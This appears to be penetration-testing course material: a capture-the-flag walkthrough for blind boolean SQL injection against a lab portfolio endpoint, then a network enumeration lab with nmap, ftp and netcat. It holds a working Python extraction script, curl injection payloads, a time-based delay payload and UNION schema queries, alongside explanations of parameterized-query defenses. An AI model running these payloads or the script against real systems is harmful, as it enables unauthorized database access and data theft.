AAPL' AND (SELECT CASE WHEN SUBSTR(flag,1,1)='O' THEN randomblob(100000000) ELSE 1 END) --

If the first character is 'O', the database generates a large random blob, causing a measurable delay. If not, the response is immediate. Exercise CF3.3 uses the boolean approach because the application provides distinct textual responses.

docs.title: Tool Primer: Python Script for Blind SQLi Extraction
docs.text:
The following script template automates boolean-based blind SQL injection. Study each section before running it. Understanding the logic is as important as getting the flag.

#!/usr/bin/env python3
"""
Blind Boolean SQL Injection - Character Extraction Script

Extracts a string value from a database column one character at a time
by sending conditional SQL queries and observing the application's
true/false response.

Usage: python3 blind_extract.py
"""

import requests
import string
import sys

# Configuration
TARGET = "http://capitalflow-blind-sqli.lab/portfolio/filter"
TRUE_INDICATOR = "Portfolio data available"

# Characters to test (printable ASCII, braces, underscore)
CHARSET = string.ascii_letters + string.digits + "_{}"

def test_condition(condition):
    """
    Send an injection payload and return True if the application
    responds with the 'true' indicator.
    """
    # The payload closes the ticker string, appends our condition,
    # and comments out the rest of the original query
    payload = f"AAPL' AND {condition} --"
    params = {"ticker": payload}
    response = requests.get(TARGET, params=params)
    return TRUE_INDICATOR in response.text

def get_length(query):
    """
    Determine the length of the value returned by a subquery.
    Tests lengths from 1 to 100.
    """
    print("[*] Determining value length...")
    for length in range(1, 101):
        condition = f"LENGTH(({query}))={length}"
        if test_condition(condition):
            print(f"[+] Length: {length}")
            return length
    print("[-] Could not determine length")
    return 0

def extract_string(query, length):
    """
    Extract the string value character by character.
    For each position, test every character in the charset.
    """
    result = ""
    print(f"[*] Extracting {length} characters...")
    for position in range(1, length + 1):
        found = False
        for char in CHARSET:
            condition = (
                f"SUBSTR(({query}),{position},1)='{char}'"
            )
            if test_condition(condition):
                result += char
                # Print progress on the same line
                sys.stdout.write(f"\r[+] Progress: {result}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            result += "?"
            sys.stdout.write(f"\r[+] Progress: {result}")
            sys.stdout.flush()
    print()  # Newline after progress
    return result

def main():
    # Step 1: Verify injection works
    print("[*] Testing injection oracle...")
    if test_condition("1=1") and not test_condition("1=2"):
        print("[+] Boolean oracle confirmed")
    else:
        print("[-] Oracle test failed. Check target and indicators.")
        sys.exit(1)

    # Step 2: Define the extraction query
    query = "SELECT hidden_flag FROM admin_secrets LIMIT 1"

    # Step 3: Get the length
    length = get_length(query)
    if length == 0:
        sys.exit(1)

    # Step 4: Extract the value
    flag = extract_string(query, length)
    print(f"\n[+] Extracted flag: {flag}")

if __name__ == "__main__":
    main()

docs.title: Script Structure Breakdown
docs.text: Function Purpose test_condition() Sends a single injection request and checks if the response contains the true indicator get_length() Determines how many characters the target value contains by testing LENGTH()=N for increasing N extract_string() Iterates through each character position, testing each candidate character until a match is found main() Orchestrates the extraction: verifies the oracle, determines length, extracts the string

docs.title: Step 1: Launch the Exercise
docs.text: Open the platform and launch "Blind Boolean SQL Injection." Note the target IP for capitalflow-blind-sqli.lab.

docs.title: Step 2: Explore the Portfolio Filter Endpoint
docs.text:
Start by sending a legitimate request to understand the normal behavior.

Kali - Query the portfolio filter with a valid ticker

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL"

Read the response. You should see "Portfolio data available" or a similar message indicating that data exists for the AAPL ticker. Note the exact wording of the response.

Kali - Query with a ticker that has no data

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=ZZZZ"

The response should differ. Look for "No data found" or a similar message. You now know what the "true" response and the "false" response look like. Record the exact text of both.

docs.title: Step 3: Confirm Boolean Injection
docs.text:
Test whether injected SQL conditions affect the response.

Kali - Inject a true condition (AND 1=1)

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%201=1%20--%20"

The payload is AAPL' AND 1=1 --. The single quote closes the ticker string. AND 1=1 is always true, so the overall query should still find AAPL data. The response should match the "true" response from Step 2.

Kali - Inject a false condition (AND 1=2)

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%201=2%20--%20"

The payload is AAPL' AND 1=2 --. The condition 1=2 is always false, so the overall WHERE clause returns no rows. The response should match the "false" response. If you see "Portfolio data available" for the true condition and "No data found" for the false condition, the boolean oracle is confirmed. You can now ask the database any yes/no question.

docs.title: Step 4: Determine the Flag Length
docs.text:
Use the LENGTH() function to determine how many characters the flag contains.

Kali - Test if the flag length is 10

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%20LENGTH((SELECT%20hidden_flag%20FROM%20admin_secrets%20LIMIT%201))=10%20--%20"

If the response shows "No data found," the length is not 10. Try other values:

Kali - Test if the flag length is 15

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%20LENGTH((SELECT%20hidden_flag%20FROM%20admin_secrets%20LIMIT%201))=15%20--%20"

Kali - Test if the flag length is 20

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%20LENGTH((SELECT%20hidden_flag%20FROM%20admin_secrets%20LIMIT%201))=20%20--%20"

When the response switches to "Portfolio data available," you have found the correct length. The flag is 20 characters long. Knowing the length lets you set the bounds for your extraction loop.

docs.title: Step 5: Extract the First Character Manually
docs.text:
Before automating, extract one character manually to verify the technique works.

Kali - Test if the first character is 'O'

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%20SUBSTR((SELECT%20hidden_flag%20FROM%20admin_secrets%20LIMIT%201),1,1)=%27O%27%20--%20"

The payload asks: "Is the first character of the flag equal to 'O'?" If the response is "Portfolio data available," the answer is yes. Since the flag format is OCR{...}, the first character should be 'O'.

Kali - Confirm the second character is 'C'

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%20SUBSTR((SELECT%20hidden_flag%20FROM%20admin_secrets%20LIMIT%201),2,1)=%27C%27%20--%20"

Kali - Confirm the third character is 'R'

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%20SUBSTR((SELECT%20hidden_flag%20FROM%20admin_secrets%20LIMIT%201),3,1)=%27R%27%20--%20"

Kali - Confirm the fourth character is '{'

curl -s "http://capitalflow-blind-sqli.lab/portfolio/filter?ticker=AAPL%27%20AND%20SUBSTR((SELECT%20hidden_flag%20FROM%20admin_secrets%20LIMIT%201),4,1)=%27%7B%27%20--%20"

Note that { must be URL-encoded as %7B. Each successful test confirms the technique works. You have verified "OCR{" as the first four characters. Extracting the remaining 16 characters manually would require testing each position against dozens of possible values. Automation is the practical approach.

docs.title: Step 6: Write the Extraction Script
docs.text:
Create a Python script to automate the extraction. Use the template from the Tool Primer section above.

Kali - Create the blind extraction script

cat > /tmp/blind_extract.py << 'SCRIPT'
#!/usr/bin/env python3
import requests
import string
import sys

TARGET = "http://capitalflow-blind-sqli.lab/portfolio/filter"
TRUE_INDICATOR = "Portfolio data available"
CHARSET = string.ascii_letters + string.digits + "_{}"

def test_condition(condition):
    payload = f"AAPL' AND {condition} --"
    params = {"ticker": payload}
    response = requests.get(TARGET, params=params)
    return TRUE_INDICATOR in response.text

def get_length(query):
    print("[*] Determining value length...")
    for length in range(1, 101):
        condition = f"LENGTH(({query}))={length}"
        if test_condition(condition):
            print(f"[+] Length: {length}")
            return length
    print("[-] Could not determine length")
    return 0

def extract_string(query, length):
    result = ""
    print(f"[*] Extracting {length} characters...")
    for position in range(1, length + 1):
        found = False
        for char in CHARSET:
            condition = (
                f"SUBSTR(({query}),{position},1)='{char}'"
            )
            if test_condition(condition):
                result += char
                sys.stdout.write(f"\r[+] Progress: {result}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            result += "?"
            sys.stdout.write(f"\r[+] Progress: {result}")
            sys.stdout.flush()
    print()
    return result

def main():
    print("[*] Testing injection oracle...")
    if test_condition("1=1") and not test_condition("1=2"):
        print("[+] Boolean oracle confirmed")
    else:
        print("[-] Oracle test failed.")
        sys.exit(1)

    query = "SELECT hidden_flag FROM admin_secrets LIMIT 1"
    length = get_length(query)
    if length == 0:
        sys.exit(1)

    flag = extract_string(query, length)
    print(f"\n[+] Extracted flag: {flag}")

if __name__ == "__main__":
    main()
SCRIPT

The script writes to /tmp/blind_extract.py. Examine the code before running it. Make sure you understand each function and how the boolean oracle works. If your target uses a different true-response text, update the TRUE_INDICATOR variable.

docs.title: Step 7: Run the Extraction Script
docs.text:
Kali - Execute the blind extraction script

python3 /tmp/blind_extract.py

Watch the output. The script first confirms the boolean oracle by testing 1=1 (should be true) and 1=2 (should be false). Then it determines the flag length by testing LENGTH()=N for increasing values of N. Finally, it extracts each character by testing SUBSTR()='X' for every character in the charset.

The extraction takes between 30 seconds and 2 minutes depending on network latency. The progress line updates as each character is found. When complete, the script prints the full flag.

If the script reports "Oracle test failed," verify that the TRUE_INDICATOR string exactly matches the application's response text. Run the curl commands from Steps 2 and 3 again to confirm.

docs.title: Step 8: Verify and Submit the Flag
docs.text:
Kali - Verify the extracted flag format

echo "Extracted flag should match: OCR{................}"

Confirm the flag starts with OCR{ and ends with }. The total length should be 20 characters. Submit the flag on the platform.

docs.title: Going Further: Optimizing the Extraction
docs.text: The script above uses a linear search: for each position, it tests every character until a match is found. On average, it tests roughly half the charset per position. Two optimizations can reduce the number of requests significantly.

docs.title: Binary Search on ASCII Values
docs.text:
Instead of testing each character individually, use a binary search on the ASCII value:

def extract_char_binary(query, position):
    """Extract a single character using binary search on ASCII value."""
    low = 32   # Space
    high = 126  # Tilde
    while low < high:
        mid = (low + high) // 2
        condition = (
            f"UNICODE(SUBSTR(({query}),{position},1))>{mid}"
        )
        if test_condition(condition):
            low = mid + 1
        else:
            high = mid
    return chr(low)

Binary search reduces the worst case from 95 requests per character to 7 (log2 of 95). For a 20-character flag, that drops the maximum from 1,900 requests to 140.

docs.title: Parallel Extraction
docs.text:
Since each character position is independent, you can extract multiple positions simultaneously using Python threading or asyncio. Parallel extraction with 5 threads reduces wall-clock time by roughly 5x.

These optimizations are not required for completing the exercise but reflect how professional assessors accelerate blind injection on real engagements.

docs.title: Analysis Questions
docs.text:
1. The developer believed that returning only "data available" or "no data found" would prevent SQL injection exploitation. Why is that assumption incorrect?

Reveal Answer

Any observable difference in application behavior, no matter how small, can serve as an oracle for blind SQL injection. The two distinct text responses ("Portfolio data available" vs. "No data found") provide a clean one-bit channel: true or false. The attacker crafts SQL conditions that evaluate to true only when a specific fact about the data is correct (e.g., "the first character of the flag is O"). By repeating queries and observing responses, the attacker reconstructs the data character by character. Even without distinct text responses, attackers can use time-based techniques (injecting delay functions) to create an oracle from response timing. The only effective prevention is parameterized queries that never allow user input to become part of the SQL syntax.

2. The extraction script tests each character position against roughly 95 printable ASCII characters. How does binary search reduce the number of requests, and why does it work?

Reveal Answer

Binary search works because ASCII characters have numeric values that can be compared with greater-than/less-than operators. Instead of asking "is the character equal to A? B? C?..." the script asks "is the character's ASCII value greater than 79?" If yes, the character is in the range 80-126. If no, the character is in the range 32-79. Each question eliminates half the remaining possibilities. After 7 questions (log2 of 95, rounded up), only one possibility remains. For a 20-character flag, binary search requires at most 140 requests compared to 1,900 for linear search. The tradeoff is slightly more complex injection payloads using UNICODE() or ASCII() comparisons instead of direct character equality.

3. If the application returned the same response text for both "data found" and "no data found" (eliminating the boolean oracle), could an attacker still extract data? How?

Reveal Answer

Yes, through time-based blind SQL injection. The attacker injects a condition that causes a measurable delay when true. In SQLite, generating a large random blob (randomblob(100000000)) takes noticeable time. The injection becomes: AAPL' AND (SELECT CASE WHEN SUBSTR(flag,1,1)='O' THEN randomblob(100000000) ELSE 1 END) --. If the first character is 'O', the response takes several seconds. If not, the response is immediate. The attacker measures response time instead of reading response text. Time-based extraction is slower and noisier than boolean-based extraction, but it works against applications that return identical content regardless of query results. The only reliable defense remains parameterized queries.

docs.title: Key Takeaways
docs.text:
• Blind SQL injection extracts data without any visible output by using the application's behavioral differences as a one-bit oracle
  • Boolean-based blind injection exploits applications that respond differently to true vs. false SQL conditions
  • SUBSTR() and LENGTH() allow character-by-character extraction from any column the database user can access
  • Manual extraction is feasible for a few characters but impractical at scale; automation with Python is essential for real assessments
  • Binary search on ASCII values reduces extraction requests from O(n) to O(log n) per character
  • Hiding data from the response does not prevent SQL injection; the application's behavior itself leaks information
  • Time-based blind injection works even when boolean responses are identical, using deliberately injected delays as the oracle
  • Parameterized queries remain the definitive defense; no amount of output suppression substitutes for proper query construction

docs.title: What You Accomplished
docs.text:
Chapter 3 covered three distinct exploitation techniques against the CapitalFlow Markets platform. Each exercise increased in complexity and required a different approach to extracting information from a web application.

Exercise Technique Core Concept Complexity CF3.1 Broken Access Control Accessing resources the developer forgot to protect Low CF3.2 UNION-Based SQL Injection Appending a second query to extract data directly Medium CF3.3 Blind Boolean SQL Injection Inferring data through true/false behavioral differences High

The progression reflects a pattern seen in real-world penetration tests. Simple misconfigurations (missing access controls) often coexist with deeper vulnerabilities (SQL injection). An assessor who stops after finding the easy wins misses the more severe findings.

docs.title: SQL Injection Methodology Comparison
docs.text:
The three primary SQL injection techniques each apply to different situations. Choosing the right approach depends on what the application reveals in its responses.

Aspect Error-Based UNION-Based Blind (Boolean/Time) When to use Application shows database error messages Application displays query results in the page Application shows only generic responses Data visibility Error messages contain extracted data Extracted data appears in normal output No data visible; inferred from behavior Speed Fast (one query per extraction) Fast (one query per table/column set) Slow (many queries per character) Skill required Low Medium High Detection risk Low request count Low request count High request count Automation needed Rarely Sometimes Almost always Key functions EXTRACTVALUE(), UPDATEXML() UNION SELECT, NULL padding SUBSTR(), LENGTH(), ASCII() Column count needed No Yes (must match exactly) No

docs.title: Broken Access Control (CF3.1)
docs.text: Step Action Purpose 1 Check robots.txt and sitemap.xml Find paths the developer tried to hide from search engines 2 Run gobuster with common wordlists Enumerate hidden directories and files 3 Probe /admin, /dashboard, /reports, /settings Test standard administrative paths 4 Test /api/* endpoints without authentication Find unprotected data APIs 5 Inspect HTML comments and JavaScript sources Discover hardcoded internal URLs

FROM sqlite_master WHERE type='table' -- 5 Get table schemas ' UNION SELECT sql,... FROM sqlite_master WHERE name='target' -- 6 Extract target data ' UNION SELECT flag,... FROM sensitive_trades --

docs.title: Defense Summary
docs.text:
Every vulnerability in Chapter 3 has a well-established fix. The following table maps each attack to its primary and secondary defenses.

Attack Primary Defense Secondary Defenses Broken Access Control Authorization middleware on every route Principle of least privilege, security headers, penetration testing UNION SQLi Parameterized queries WAF, input validation, least-privilege DB accounts, error suppression Blind Boolean SQLi Parameterized queries WAF, rate limiting, query logging, anomaly detection

Parameterized queries appear twice because they eliminate SQL injection at the root. No amount of output suppression, WAF rules, or input filtering substitutes for separating data from code at the query level.

docs.title: Self-Assessment Questions
docs.text:
Rate your confidence (1-5) on each skill after completing the chapter exercises.

Skill Confidence (1-5) Distinguishing authentication from authorization failures Using gobuster for directory enumeration Interpreting HTTP status codes during enumeration Determining UNION SELECT column counts Enumerating database schemas via sqlite_master Extracting data with UNION SELECT Confirming a boolean blind injection oracle Using SUBSTR() and LENGTH() for character extraction Writing Python automation for blind extraction Explaining parameterized queries as a defense

If any skill scores below 3, revisit the corresponding exercise and repeat the walkthrough. Spend extra time on the background sections and analysis questions for that topic.

docs.title: Common Mistakes to Avoid
docs.text:
Forgetting to URL-encode injection payloads. Spaces, single quotes, and special characters in URL parameters must be encoded. A payload that works in a SQL console may fail in curl because the browser or HTTP client does not transmit special characters correctly. Use %20 for spaces, %27 for single quotes, and --data-urlencode when available.

Skipping column count enumeration for UNION attacks. Guessing the column count wastes time and produces confusing errors. Always start with UNION SELECT NULL and increment systematically. The first successful response confirms the exact count.

Assuming all databases use the same schema tables. sqlite_master works only in SQLite. MySQL and PostgreSQL use information_schema. Using the wrong metadata table produces errors that may be mistaken for a non-injectable parameter. Identify the database type first.

Running blind extraction manually instead of scripting. Extracting more than a few characters by hand is error-prone and slow. Write the script, test it against a known value (like the first four characters "OCR{"), and then let it run.

Confusing access control fixes with injection fixes. Adding a login requirement to an endpoint does not fix SQL injection in its parameters. Both vulnerabilities must be addressed independently.

docs.title: What Comes Next
docs.text:
Chapter 3 demonstrated exploitation against individual endpoints. Real-world assessments chain vulnerabilities together: an access control failure reveals an endpoint, injection against that endpoint leaks credentials, and those credentials provide access to additional systems. Future chapters cover:

  • Cross-Site Scripting (XSS): Injecting client-side code that executes in other users' browsers
  • Server-Side Request Forgery (SSRF): Forcing the server to make requests on the attacker's behalf
  • Attack Chains: Combining multiple vulnerabilities into a complete compromise path

The SQL injection techniques from CF3.2 and CF3.3 form the foundation for every database-backed exploitation technique you will encounter in later chapters. Mastering the methodology (confirm injection, enumerate schema, extract data) prepares you for any variant.

docs.title: Why Weekly Practice Matters
docs.text:
Cybersecurity skills atrophy without practice. Reading about port scanning, SQL injection, or privilege escalation builds awareness, but hands-on repetition builds competence. Each of the 15 course weeks pairs two labs; a fully guided exercise that teaches the technique step by step, and an unguided reinforcement exercise that demands independent application of the same skills in a harder scenario. Thirty labs total provide a structured progression from basic enumeration through advanced multi-system attacks, with each week building on skills from previous weeks.

Every guided lab presents a realistic scenario with detailed walkthrough instructions. The reinforcement lab that follows drops the hand-holding: you receive a scenario and objectives, but no step-by-step directions. Reinforcement exercises require breadcrumb chaining (discovering clues that unlock the next stage) and composite flag assembly (collecting markers from multiple locations and combining them into a single flag). The scenarios mirror real-world penetration testing engagements where you receive limited information, choose your own tools, and work through the problem methodically.

docs.title: What You Will Learn
docs.text:
The course divides into three phases. Each phase introduces new categories of attack techniques while reinforcing skills from earlier weeks. Within each phase, guided labs (labeled "Challenge N") teach the core technique, and reinforcement labs (labeled "Challenge NB") test retention without instructions.

docs.text:
Confirm each item below before beginning Week 1. If any item is incomplete, resolve it first; the labs will not work without a functioning VPN connection.

  • Platform account is created and approved
  • VPN configuration is downloaded and installed
  • VPN tunnel connects successfully (test with ping to a lab IP)

docs.title: Before You Begin
docs.text: The course begins with a hands-on engagement that mirrors the very first task a security analyst would perform: discovering what services a target machine is exposing to the network. Your VPN (Virtual Private Network) must be connected before you start the lab, because the target machine lives on an isolated network that your browser cannot reach directly. If you have not yet configured your VPN client, review the VPN Setup Guide before continuing.

docs.title: Scenario
docs.text:
Orion TechWorks, a small IT managed services provider based in Boise, Idaho, has hired your firm to perform an external network assessment. The engagement is limited to a single host sitting in the company's DMZ (Demilitarized Zone); a network segment that separates public-facing servers from the internal corporate network.

Your point of contact is Jake Morrison, the company's Network Administrator. Jake provided the target IP address and a clear directive: "We want to know exactly what is exposed. Scan the server, identify every service, and tell us what an attacker could learn from each one." Jake believes the server runs only SSH (Secure Shell) and a web server, but he admits he has not audited the machine recently.

Your job is to prove; or disprove; Jake's assumptions. Three security tokens have been placed across the services for you to collect. Combine them to form the final flag and submit it.

docs.title: Your Objectives
docs.text:
• Use Nmap to perform a full TCP (Transmission Control Protocol) port scan against the target host
  • Identify all running services and their version information
  • Interact with each discovered service to extract tokens
  • Discover services running on non-standard ports
  • Combine the tokens and submit the flag

docs.title: Background: Port Scanning and Service Interaction
docs.text:
Port scanning is the process of sending packets to a range of port numbers on a target machine and observing the responses. Every network service; whether it is a web server, a file transfer server, or a remote login daemon; listens on a specific port number. A machine has 65,535 TCP ports available, and any number of them could be running a service. The scanner's job is to find which ports are open and report back.

Discovering an open port is only the first step. The real value comes from interacting with each service to learn what it reveals. A web server might expose application details in its HTML (HyperText Markup Language) source code. An FTP (File Transfer Protocol) server might allow anonymous logins and serve files to anyone who connects. A custom service on an unusual port might broadcast a banner message the moment a client connects. Each piece of information adds to the picture of the target's exposure.

Security professionals call the combination of scanning and service interaction enumeration. Enumeration answers the question "what can an outsider learn about the target without any credentials or special access?" The answer often surprises system administrators; as Jake Morrison may be about to find out.

graph LR
    A["Attacker<br/>runs port scan"] --> B["Open ports<br/>discovered"]
    B --> C["Interact with<br/>each service"]
    C --> D["Extract info<br/>from responses"]
    D --> E["Build target<br/>profile"]

    style A fill:#4a90d9,color:#fff
    style B fill:#e8a735,color:#fff
    style C fill:#e8a735,color:#fff
    style D fill:#e8a735,color:#fff
    style E fill:#6aaa64,color:#fff

docs.title: Tool Primer: Nmap, curl, ftp, and nc
docs.text:
The primary tool for port scanning is Nmap (Network Mapper). A basic Nmap scan checks the 1,000 most common ports, but that default range can miss services running on higher or non-standard ports. For a thorough assessment, you should specify a wider port range and enable service version detection.

Full-range scan with version detection

The command below scans a wide port range and identifies the software behind each open port. You will run the live version of this scan in the walkthrough.

nmap -sV -p 1-10000 <target_ip>

Each flag in the command serves a specific purpose:

  • -sV: probe open ports to determine the service name and version number. Without this flag, Nmap guesses the service based on the port number alone. With it, Nmap sends additional requests to confirm what is actually running.
  • -p 1-10000: scan ports 1 through 10,000 instead of the default 1,000. Expanding the range increases the chance of finding services on non-standard ports, such as a custom application listening on port 8888.

Sample output:

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.100.5.15
Host is up (0.003s latency).
Not shown: 9996 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.9
80/tcp   open  http        nginx 1.18.0
8888/tcp open  unknown

Reading the columns:

  • PORT: the port number and protocol (TCP in these exercises)
  • STATE: whether the port is open, closed, or filtered
  • SERVICE: what Nmap believes the service to be
  • VERSION: the software name and version number, populated when -sV is used

Three additional tools help you interact with discovered services:

curl: make an HTTP request

curl is a command-line tool for making HTTP requests. Use it to retrieve a web page's content, including HTML source code that may contain hidden information.

curl http://<target_ip>/

ftp: connect to an FTP server

ftp is a command-line FTP client. Use it to connect to an FTP server and browse or download files. Many FTP servers allow anonymous access, meaning you can log in with the username anonymous and any password.

ftp <target_ip>

nc: read a service banner

nc (netcat) is a general-purpose network tool that can connect to any TCP port and display whatever the service sends back. Use it to read banners from unknown or custom services.

nc <target_ip> 8888

docs.title: Step 1: Launch the Exercise
docs.text:
The lab environment runs inside containers on the platform's server. Launching the lab creates a dedicated target machine and assigns it an IP address on your VPN subnet. You need a running lab before any scanning or service interaction will work.

  • Navigate to Exercises and locate the Week 1 challenge
  • Click Launch on "Network Discovery"
  • Wait for the status to change to Running
  • Note the target IP displayed in the Active Lab View

docs.title: Step 2: Verify VPN Connectivity
docs.text:
Verify connectivity to the target

Before scanning, confirm that your VPN tunnel is active and can reach the target. A failed scan often has nothing to do with the target; the VPN connection may have dropped.

ping -c 3 <target_ip>

Replace <target_ip> with the IP shown in the Active Lab View. You should see three replies with round-trip times. If the ping times out, reconnect your VPN before continuing.

docs.title: Step 3: Run a Full Port Scan
docs.text:
Run a full port scan with version detection

Now run a scan that covers ports 1 through 10,000 with service version detection enabled. The default 1,000-port scan would miss any service running on a non-standard port, so expanding the range is essential for a thorough assessment.

nmap -sV -p 1-10000 <target_ip>

The scan may take 30 to 60 seconds to complete. Watch the terminal for the results table. You should discover four open ports: 21 (FTP), 22 (SSH), 80 (HTTP), and 8888 (an unknown or custom service). If you see fewer than four, widen the port range or verify that your VPN connection is stable.

docs.title: Step 4: Interact with the HTTP Service
docs.text:
Retrieve the HTTP page source

Port 80 is running an HTTP web server. Use curl to retrieve the web page and examine its HTML source for hidden information. Web developers and administrators sometimes leave comments, debug output, or internal references in the page source that are not visible in a browser's normal rendering.

curl http://<target_ip>/

Look through the output carefully. Somewhere in the HTML source, you will find a token value. Record the token; you will need it later to assemble the flag.

Filter the page source for the token

If the output is long, you can pipe it through grep to search for the word "Token":

curl -s http://<target_ip>/ | grep -i token

The matching line isolates the token without scrolling through the full page source.

docs.title: Step 5: Interact with the FTP Service
docs.text:
Connect to the FTP service anonymously

Port 21 is running an FTP server. Many FTP servers are configured to allow anonymous access, meaning anyone can log in without a real account. Connect to the FTP service and attempt an anonymous login.

ftp <target_ip>

When prompted for a username, type anonymous. When prompted for a password, press Enter or type any value; anonymous FTP servers typically accept anything. Once logged in, list the available files:

ls

Look for a file that might contain a token (such as token.txt). Download it using the get command:

get token.txt

Type bye to disconnect from the FTP server.

Read the downloaded FTP file

Read the downloaded file on your local machine.

cat token.txt

Record the token value you find inside.

docs.title: Step 6: Interact with the Custom Service on Port 8888
docs.text:
Port 8888 is running an unknown or custom service. Nmap could not identify it by name, which means you need to connect manually and see what it sends back. Many custom services display a banner: a text message sent to any client that connects.

Grab the banner from the custom service

Use netcat to connect to port 8888.

nc <target_ip> 8888

Read the banner message that appears. The service will display a token as part of its output. Record the token and then press Ctrl+C to disconnect.

docs.title: Record Your Findings
docs.text:
Copy your full Nmap output from Step 3 and paste it below.

My Nmap output:

(paste your output here)

Open ports I found:

Port State Service Version

Tokens I collected:

Source Token Value HTTP (port 80) FTP (port 21) Port 8888 banner

Assembled flag:

OCR{...}

docs.title: Step 7: Interpret the Results
docs.text:
Review your findings and consider what they reveal about the target. Four services were exposed on the Orion TechWorks server, but Jake Morrison believed only SSH and a web server were running.

  • Port 22 (SSH): a remote login service. SSH is encrypted and generally considered secure when properly configured. Finding SSH open is expected on a Linux server.
  • Port 80 (HTTP): a web server powered by nginx. The HTML source contained a token. Page source can reveal information not visible in the rendered page.
  • Port 21 (FTP): a file transfer service configured for anonymous access. Anyone on the network could connect and download files without credentials. Jake did not know FTP was running, which means no one was monitoring or maintaining it.
  • Port 8888 (Custom Service): an unidentified service broadcasting a banner with sensitive information. A service on a non-standard port that Jake did not mention is a significant finding.
